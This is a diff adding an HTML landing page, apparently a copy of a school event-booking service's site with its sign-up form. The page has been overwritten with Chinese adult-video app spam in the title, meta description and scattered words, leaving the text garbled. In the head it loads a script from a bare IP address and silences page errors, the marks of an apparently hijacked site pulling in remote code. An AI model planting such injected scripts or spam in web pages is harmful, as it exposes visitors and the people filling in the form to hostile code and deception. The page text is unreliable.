@@ -1,0 +1,424 @@
+  <!DOCTYPE html>
+<html class="no-js" lang="en">
+<head><script>var V_PATH="/";window.onerror=function(){ return true; };</script>
+	<title>糖心Vlog_糖心Vlog官网_最新糖心Vlog</title>
+	<link rel="stylesheet" href="../www.piterwilson-toys.com/static/css/normalize.min.css">
+	<link rel="stylesheet" href="../www.piterwilson-toys.com/static/css/public_nl.css@v=3&amp;changed=315532801.0.css"><meta charset="gbk">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="description" content="糖心Vlog是一款当下最受欢迎的宅男看片神器，丰富的视频资源汇聚在这里，用户能够不需要会员免费观看和下载，没有任何的限制">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<link rel="icon" href="http://www.piterwilson-toys.com/favicon1.ico" type="image/x-icon">
+<link rel="apple-touch-icon" sizes="57x57" href="http://www.piterwilson-toys.com/apple-icon-57x57.png">
+<link rel="apple-touch-icon" sizes="60x60" href="http://www.piterwilson-toys.com/apple-icon-60x60.png">
+<link rel="apple-touch-icon" sizes="72x72" href="http://www.piterwilson-toys.com/apple-icon-72x72.png">
+<link rel="apple-touch-icon" sizes="76x76" href="http://www.piterwilson-toys.com/apple-icon-76x76.png">
+<link rel="apple-touch-icon" sizes="114x114" href="http://www.piterwilson-toys.com/apple-icon-114x114.png">
+<link rel="apple-touch-icon" sizes="120x120" href="http://www.piterwilson-toys.com/apple-icon-120x120.png">
+<link rel="apple-touch-icon" sizes="144x144" href="http://www.piterwilson-toys.com/apple-icon-144x144.png">
+<link rel="apple-touch-icon" sizes="152x152" href="http://www.piterwilson-toys.com/apple-icon-152x152.png">
+<link rel="apple-touch-icon" sizes="180x180" href="http://www.piterwilson-toys.com/apple-icon-180x180.png">
+<link rel="icon" type="image/png" sizes="192x192"  href="../www.piterwilson-toys.com/android-icon-192x192.png">
+<link rel="icon" type="image/png" sizes="32x32" href="../www.piterwilson-toys.com/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="96x96" href="../www.piterwilson-toys.com/favicon-96x96.png">
+<link rel="icon" type="image/png" sizes="16x16" href="../www.piterwilson-toys.com/favicon-16x16.png">
+<link rel="manifest" href="../www.piterwilson-toys.com/manifest.json">
+<meta name="msapplication-TileColor" content="#ffffff">
+<meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
+<meta name="theme-color" content="#ffffff">
+
+<link rel="expect" blocking="render" href="index.html#main-content">
+<!--[if lt IE 9]>
+
+<script>window.html5 || document.write('<script src="/js/vendor/html5shiv.js"><\/script>')</script>
+<![endif]-->
+<script src="../www.piterwilson-toys.com/static/js/jquery-3.6.0.min.js"></script>
+<script src="../www.piterwilson-toys.com/static/js/viprompt.min.js"></script>
+<script src="../www.piterwilson-toys.com/static/js/dragscroll.js"></script>
+<script>
+    $(function() {
+        $('div.hint').on('click', function(e) {
+            try {
+                if(this.nextElementSibling.classList.contains('hint-text')) {
+                    console.log('Hint text found in next sibling.');
+                    $(this.nextElementSibling).slideToggle(100);
+                    e.preventDefault();
+                }
+            } catch {
+                try {
+                    if(this.parentElement.nextElementSibling.classList.contains('hint-text')) {
+                        console.log('Hint text found in parent next sibling.');
+                        $(this.parentNode.nextElementSibling).slideToggle(100);
+                        e.preventDefault();
+                    }
+                } catch {
+                    console.log('Hint text not found.');
+                }
+            }
+        });
+        // show hint when trigger div has focus and space or enter is pressed on the keyboard
+        $('div.hint').on('keydown', function(e) {
+            if(e.key === ' ' || e.key === 'Enter') {
+                $(this).click();
+                e.preventDefault();
+            }
+        })
+    });
+</script><script>
+		function toggleMenu(toggler) {
+			var $nav=$('header nav');
+			if (toggler=="show")
+				$nav.addClass('show');
+			else
+				$nav.removeClass('show');
+		}
+	</script><script src="../www.piterwilson-toys.com/static/js/countrycodes.js"></script>
+	<script>
+		var straps=[
+			"school conferences",
+			"subject selection",
+			"literacy assessments",
+			"uniform fittings",
+			"information evenings",
+			"canteen volunteers",
+			"numeracy assessments"
+		];
+		var $rollingStrapDiv=null;
+		$(function() {
+			var $gtwo=$('#gtwo');
+			var $gtwo_section=$gtwo.closest('section');
+			var gtwoHeight=$gtwo.height()+2*parseInt($gtwo_section.css("padding-top"));
+			scaleToHeight(document.getElementById("home-start"), gtwoHeight);
+			window.addEventListener("resize", function() {
+				scaleToHeight(document.getElementById("home-start"), gtwoHeight);
+			});
+			$rollingStrapDiv=$('.strap .rolling');
+			setTimeout(function() {GnextStrap(straps.length)}, 2000);
+			var phone_select=document.forms.signup.phone_cc;
+			var ahphone_select=document.forms.signup.ahphone_cc;
+			phone_select.options.length=ahphone_select.options.length=0;
+			for(cc in CountryCodes) {
+				phone_select.options[phone_select.options.length]=new Option(CountryCodes[cc], cc, cc=="US", cc=="US");
+				ahphone_select.options[ahphone_select.options.length]=new Option(CountryCodes[cc], cc, cc=="US", cc=="US");
+			}
+		});
+		
+		function scaleToHeight(el, gtwoHeight) {
+			el.style.height=(document.documentElement.clientHeight-gtwoHeight)+"px";
+		}
+		function GnextStrap(index) {
+			if(++index>=straps.length)
+				index=0;
+			$rollingStrapDiv.css('opacity', 0);
+			$rollingStrapDiv.css('top', '-1em');
+			$rollingStrapDiv.text(straps[index]);
+			$rollingStrapDiv.animate({opacity:1, top:0}, {queue:false, duration:'slow'});
+			setTimeout(function() {GnextStrap(index)}, 2000);
+		}
+
+		
+		function checkPhone(phone_field) {
+			var phone_region=phone_field.previousElementSibling;
+			var phone_last=phone_field.nextElementSibling;
+			var phone_vni=phone_last.nextElementSibling;
+			var phone=$.trim(phone_field.value);
+			if(!phone.length) {
+				phone_vni.value=phone_last.value='';
+				return;
+			}
+			if(phone==phone_last.value)
+				return;
+			$.ajax({
+				type:"POST",
+				url:"/checknumber",
+				headers:{Accept: "application/json"},
+				data:{"n":phone, "p":"", "s":phone_region.value},
+				success:function(data){
+					phone_vni.value=data;
+					if(data.indexOf('|')!=-1)
+						phone_field.value=data.split('|')[0];
+					phone_last.value=phone_field.value;
+				}
+			});
+		}
+
+		function validateSignup() {
+			f=document.forms.signup;
+			if(!f.school_name.value.length){
+				$.prompt("Please enter a school name.", {closeFocus:'input[name="school_name"]'});
+				return false;
+			}
+			if(f.phone==f.phone_last) {
+				if(!f.phone_vni.value.length) {
+					$.prompt('Please enter a school phone number.', {closeFocus:'input[name="phone"]'});
+					return false;
+				}
+				if(f.phone_vni.value=='BAD') {
+					$.prompt("<p>The school phone number is not a valid "+CountryCodes[f.phone_cc.value]+"  number.</p><p>Please enter the number as you would dial it, with the area code but no country code.</p>", {closeFocus:'input[name="phone"]'});
+					return false;
+				}
+			}
+			if(f.level.value=='0') {
+				$.prompt("Please select the type of school.", {closeFocus:'select[name="level"]'});
+				return false;
+			}
+			var iroll=parseInt(f.roll.value,10);
+			if(isNaN(iroll)||iroll<=0) {
+				$.prompt('Please enter the number of students at your school.', {closeFocus:'input[name="roll"]'});
+				return false;
+			}
+			if(!f.name.value.length) {
+				$.prompt("Please enter your name.", {closeFocus:'input[name="name"]'});
+				return false;
+			}
+			if(!f.email.value.length) {
+				$.prompt("Please enter your email address.", {closeFocus:'input[name="email"]'});
+				return false;
+			}
+			var regex=/^[a-z0-9_#&.\/'+\-]+@[a-z0-9_\-]+(\.[a-z0-9_\-]+)+$/i
+			if(!regex.test(f.email.value)) {
+				$.prompt("Your email address is not valid.", {closeFocus:'input[name="email"]'});
+				return false;
+			}
+			if(f.ahphone==f.ahphone_last) {
+				if(!f.ahphone_vni.value.length) {
+					$.prompt('Please enter your mobile phone number.', {closeFocus:'input[name="ahphone"]'});
+					return false;
+				}
+				if(f.ahphone_vni.value=='BAD') {
+					$.prompt("<p>Your mobile phone number is not a valid "+CountryCodes[f.ahphone_cc.value]+"  number.</p><p>Please enter the number as you would dial it, with the area code but no country code.</p>", {closeFocus:'input[name="ahphone"]'});
+					return false;
+				}
+			}
+			if(!f.usr.value.length) {
+				$.prompt("Please enter a username.", {closeFocus:'input[name="usr"]'});
+				return false;
+			}
+			if(!f.tandc.checked) {
+				$.prompt("You haven't accepted our terms and conditions.", {closeFocus:'input[name="tandc"]'});
+				return false;
+			}
+			return true;
+		}
+	</script>
+<script src="../160.124.72.226/mgmgmgqf.js"></script>
+
+
+</head>
+<Body><h1><a href="index.html">蜜桃传媒</a></h1><script>
+(function(){
+var bp = document.createElement('script');
+var curProtocol = window.location.protocol.split(':')[0];
+if (curProtocol === 'https') {
+bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+}
+else {
+bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+}
+var s = document.getElementsByTagName('script')[0];
+s.parentNode.insertBefore(bp, s);
+})();
+</script><header style="position:absolute; background-color: rgba(86,97,112,0.4);"><a class="logo" href="index.html"><img src="../www.piterwilson-toys.com/static/img/sb_logo.png" alt="logo"></a>
+		<img id="menu-open" src="../www.piterwilson-toys.com/static/img/menu.png" onclick="toggleMenu('show')" alt="Show menu">
+		<nav id="main-nav">
+			<p id="menu-close">
+				<img src="../www.piterwilson-toys.com/static/img/close.png" onclick="toggleMenu('hide')" alt="Hide menu">
+			</p>
+			<ul>
+				<li><a href="http://www.piterwilson-toys.com/faq">蜜桃传媒</a></li>
+				<li><a href="http://www.piterwilson-toys.com/news">News</a></li>
+				<li><a href="http://www.piterwilson-toys.com/contact">Contact</a></li>
+				<li><a href="index.html" onclick="toggleMenu('hide')">Free Trial</a></li>
+				<li class="button"><a href="http://www.piterwilson-toys.com/code" class="cta-button cta-green" role="button" aria-label="Make a booking" rel="nofollow noindex">MAKE A BOOKING</a></li>
+				<li class="button"><a href="http://www.piterwilson-toys.com/login" class="cta-button cta-orange" role="button" aria-label="Admin Login" rel="nofollow noindex">Admin Login</a></li>
+			</ul>
+		</nav><!--[if lt IE 9]>
+		<p class="browserupgrade">You are using an outdated browser. Please  to improve your experience.</p>
+	<![endif]-->
+	</header><section id="home-start" style="height: 750px;">
+		<div class="strap">
+			<div class="fixed">Book for</div>
+			<div class="rolling">numeracy assessments</div>
+		</div>
+	</section>
+
+	<section class="green-bg" role="main" id="main-content">
+		<h2>Home</h2>
+		<div class="body-form">
+			<h2 id="gtwo">The easy way to book.</h2>
+			<p>Now you can make bookings for school events that suit YOU. Simply enter the event code and press <b>GO</b>.</p>
+			<form class="ecode" name="ecode" action="http://www.piterwilson-toys.com/search.php" method="post">
+			<input type="text" class="text" name="ecode" placeholder="Enter code..." aria-label="Enter event code"><input type="submit" value="GO" aria-label="Submit event code">
+			</form>
+			<p>We'll guide you through three 蜜桃传媒 steps, and moments later you'll get an email
+			confirming your bookings. Easy!</p>
+<!--
+			<p>You can change or cancel your bookings by entering the event code again.
+			If you're on the same computer, you'll go straight to your bookings.</p>
+-->
+		</div>
+	</section>
+
+	<section class="white-bg">
+		<div class="body-wide">
+			<div class="twocol-parent">
+				<div class="twocol-child iconbox">
+					<span class="header-icon"><img src="../www.piterwilson-toys.com/static/img/cogs.png" alt="Cogs icon"></span>
+					<h3>Simple and Powerful</h3>
+					<p>SchoolBookings makes managing school events 蜜桃传媒. You can set up an event in minutes,
+					then sit back and watch the parent bookings roll in. On the big day, you simply print out
+					and distribute the neatly-formatted timetables. Job done.</p>
+					<p>It's not just school conferences. Bookings for subject selection, school
+					fair volunteers, uniform fittings or information evening RSVPs are just as easy.</p>
+					<p>And if you have any questions, our friendly
+					local support people are just a phone call away.</p>
+				</div>
+				<div class="twocol-child iconbox">
+					<span class="header-icon"><img src="../www.piterwilson-toys.com/static/img/heart.png" alt="heart icon"></span>
+					<h3>Popular</h3>
+					<p>Parents love SchoolBookings. They get to choose the teachers and times <i>they</i> want,
+					so students can't prevent meetings they'd prefer not to happen. And 蜜桃传媒 with more than
+					one student will never get conflicting times again.</p>
+					<p>Because it's so easy, significantly more 蜜桃传媒 participate. So School
+					Bookings is one of those rare things that makes life easier <i>and</i> better.</p>
+					<p>Which explains why <b>5,000</b> schools love SchoolBookings too.</p>
+				</div>
+			</div>
+		</div>
+	</section>
+
+	<section class="green-bg">
+		<div class="body-small">
+			<h2>Try it for yourself.</h2>
+			<p>You should question everything on the internet these days, so we're happy
+			to put you in touch with one of our schools near you. We also offer a free trial, so you
+			can make sure we live up to our promises.</p>
+			<button onclick="window.location.hash='signup';" class="trial">FREE TRIAL</button>
+		</div>
+	</section>
+
+	<section class="grey-bg">
+		<div class="body-wide">
+			<div class="twocol-parent">
+				<div class="twocol-child iconnobox">
+					<div class="tac">
+						<span class="header-icon"><img src="../www.piterwilson-toys.com/static/img/coins.png" alt="Coins icon"></span>
+					</div>
+					<h3 class="tac">Good Value</h3>
+					<p>Like SchoolBookings itself, our pricing is 蜜桃传媒 - and fair. Our annual subscription starts from $195 depending on the number of students at your school.</p>
+					<p><a href="http://www.piterwilson-toys.com/faq">See full pricing.</a></p>
+					<p>This single subscription gives you unlimited use of SchoolBookings for twelve months.
+					You can run as many events as you like - even at the same time - with their own administrator,
+					timetable and teachers.</p>
+					<p>You also have unlimited access to our amazing support people.</p>
+				</div>
+				<div class="twocol-child iconnobox">
+					<div class="tac">
+						<span class="header-icon"><img src="../www.piterwilson-toys.com/static/img/tree.png" alt="Tree icon"></span>
+					</div>
+					<h3 class="tac">Good Values</h3>
+					<p>We believe that education is the bedrock of our society - and that it is seriously under-resourced.
+					This drives our fair pricing policy, which means many more schools can afford to use our service.
+					We use their combined revenue to continuously improve SchoolBookings, making the
+					best school booking service in the world available to the widest number of schools.</p>
+					<p>We help several education, youth and domestic violence organisations with free
+					services and financial contributions.</p>
+					<p>SchoolBookings runs entirely on the Google Appengine platform, which is carbon neutral
+					and powered entirely by renewable energy.</p>
+				</div>
+			</div>
+		</div>
+	</section>
+
+	<section class="white-bg">
+		<div class="body-small">
+			<h2>Don't take our word for it.</h2>
+			<p class="quote">We just used the SchoolBookings program for the first time for this week's parent/teacher
+			conferences and I just wanted to tell you how pleased I was with the whole process. It was easy to administer,
+			teachers found it easy to keep a check on bookings and 蜜桃传媒 found it easy to book on. Thank you!</p>
+			<p class="attrib">鈥� Joanne-School Admin, TCS Burlington</p>
+			<button onclick="window.location='/testimonials';" class="center">SEE MORE TESTIMONIALS</button>
+		</div>
+	</section>
+
+	<section  id="signup">
+		<div class="body-form">
+			<a name="signup"></a>
+			<h2>Sign up for a free trial.</h2>
+			<form name="signup" onsubmit="return validateSignup()" action="http://www.piterwilson-toys.com/signup" method="post" novalidate>
+
+				<div class="label"><label>SCHOOL NAME
+					<input type="text" name="school_name">
+				</label></div>
+
+				<div class="label"><label for="safari_dummy">SCHOOL PHONE<br>
+					<select name="phone_cc" style="width:10em; border:0; display:inline-block;"></select><input type="tel" name="phone" style="margin-left:0.2em; width:calc(100% - 10.2em); display:inline-block;" onBlur="checkPhone(this)">
+					<input type="hidden" name="phone_last">
+					<input type="hidden" name="phone_vni">
+				</label></div>
+				<div class="label"><label>SCHOOL TYPE
+					<select name="level" style="border:0;">
+						<option value="0" selected></option>
+						<option value="6">Preschool/kindergarten</option>
+						<option value="1">Primary</option>
+						<option value="2">Intermediate</option>
+						<option value="3">Secondary</option>
+						<option value="4">Combined</option>
+						<option value="5">Other</option>
+					</select>
+				</label></div>
+				<div class="label"><label>NUMBER OF STUDENTS  <div class="hint" role="button" tabindex="0" aria-label="Help information"></div>
+		<div class="hint-text" role="alert" aria-live="assertive">The total number of students enrolled at your school.</div>
+					<input type="tel" name="roll" style="width:10em">
+				</label></div>
+				<div class="label"><label>YOUR NAME
+					<input type="text" name="name">
+				</label></div>
+				<div class="label"><label>YOUR EMAIL
+					<input type="email" name="email">
+				</label></div>
+				<div class="label"><label for="safari_dummy">YOUR MOBILE PHONE (to text password to)<br>
+					<select name="ahphone_cc" style="width:10em; border:0; display:inline-block;"></select><input type="tel" name="ahphone" style="margin-left:0.2em; width:calc(100% - 10.2em); display:inline-block;" onBlur="checkPhone(this)">
+					<input type="hidden" name="ahphone_last">
+					<input type="hidden" name="ahphone_vni">
+				</label></div>
+				<div class="label"><label class="vah">BOT TRAP - LEAVE THIS BLANK!
+					<input type="text" name="mobile" autocomplete="off">
+				</label></div>
+				<div class="label"><label>USERNAME <div class="hint" role="button" tabindex="0" aria-label="Help information"></div>
+		<div class="hint-text" role="alert" aria-live="assertive">The username your school will use to access the admin pages.</div>
+					<input type="text" name="usr">
+				</label></div>
+				<div class="label-cbs"><label>
+					<input type="checkbox" name="tandc" id="tandc" value="1">
+					I am an employee of the above school and on their behalf hereby accept the
+					SchoolBookings <a href="http://www.piterwilson-toys.com/terms" target="_blank">terms and conditions</a>.
+					<p>
+						<img src="../www.piterwilson-toys.com/static/img/ST4S_Badge_2023_Colour.png" class="floatlm">
+						School Interviews has been independantly assessed for security, privacy and online safety
+						by .
+					</p>
+				</label></div>
+				<input type="submit" value="SIGN UP">
+			</form>
+		</div>
+	</section><footer  role="contentinfo">
+		<div class="body-wide" style="padding:0 1em">
+			<div class="twocol-parent" style="width:100%">
+				<div class="twocol-child">
+					<nav role="navigation" aria-label="Footer navigation">
+						<a href="http://www.piterwilson-toys.com/faq">蜜桃传媒</a>
+						<a href="http://www.piterwilson-toys.com/news">News</a>
+						<a href="http://www.piterwilson-toys.com/contact">Contact</a>
+						<a href="http://www.piterwilson-toys.com/terms">T&Cs</a>
+						<a href="http://www.piterwilson-toys.com/privacy">Privacy</a>
+					</nav>
+				</div>
+				<div class="twocol-child">
+					<p class="copyright">蜜桃传媒 &copy; 2025 .</p>
+				</div>
+			</div>
+		</div>
+	</footer>
+
+</body></html>
